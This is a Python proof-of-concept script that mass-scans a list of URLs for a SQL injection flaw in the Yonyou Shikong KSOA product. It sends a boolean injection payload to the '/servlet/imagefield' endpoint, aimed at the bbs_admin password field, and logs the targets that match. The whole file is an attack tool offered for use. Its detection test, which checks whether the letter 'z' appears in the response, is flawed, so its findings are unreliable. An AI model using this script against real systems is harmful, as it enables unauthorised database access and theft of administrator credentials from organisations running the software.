"""
用友时空KSOA_SQL注入 POC
"""
import argparse, sys, requests
from multiprocessing.dummy import Pool
from rich.console import Console
import textwrap
from functools import partial
requests.packages.urllib3.disable_warnings()
console = Console()

text = """



 ██▓███   ▒█████   ▄████▄  
▓██░  ██▒▒██▒  ██▒▒██▀ ▀█  
▓██░ ██▓▒▒██░  ██▒▒▓█    ▄ 
▒██▄█▓▒ ▒▒██   ██░▒▓▓▄ ▄██▒
▒██▒ ░  ░░ ████▓▒░▒ ▓███▀ ░
▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ░▒ ▒  ░
░▒ ░       ░ ▒ ▒░   ░  ▒   
░░       ░ ░ ░ ▒  ░        
             ░ ░  ░ ░      
                  ░        

                                      @version:1.0.0
                                      @author:zt-byte        

    """


def current(text):
    console.print(f"[+]{text} 存在漏洞", style="bold green")

def ban(text):
    console.print(text, style="bold yellow")


def poc(url, outfile):
    url_new = url + "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=1' AND 7849=7849 AND 'aFzx'='aFzx"
    try:
        response = requests.get(url_new, verify=False, timeout=5)
        if "z" in response.text:
            current(url)
            with open(f"{outfile}", 'a', encoding="utf-8") as f:
                f.write(url_new + "\n")
        else:
            print(url + "不存在漏洞")
    except:
        pass


def Read_File(infile):
    list = []
    with open(f"{infile}", "r", encoding="utf-8") as f:
        result = f.readlines()

        for ip in result:
            ip = ip.strip("\n")
            list.append(ip)
    return list


if __name__ == '__main__':
    ban(text)
    parser = argparse.ArgumentParser(description='用友时空KSOA_SQL注入 POC',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent(
                                         '''example:  python poc1.py -f ip.txt -o result.txt -h 20'''))
    parser.add_argument("-f", "--file", dest="file", type=str, help="要查询的url文件，example:urls.txt")
    parser.add_argument("-o", "--output", dest="result", type=str, default="result.txt",
                        help="结果的保存位置 ,default=result.txt example: result.txt")
    parser.add_argument("-t", "--thread", dest="thread", type=int, default=10,
                        help="设置线程数 ; default=10 ; example: --thread = 20 ")
    args = parser.parse_args()

    url_list = Read_File(args.file)

    pool = Pool(args.thread)  # 20自己指定的线程数
    partial_printNumber = partial(poc, outfile=args.result)
    pool.map(partial_printNumber, url_list)  # 调用进程池的map方法
    pool.close()  # 关闭进程池，禁止提交新的任务
    pool.join()
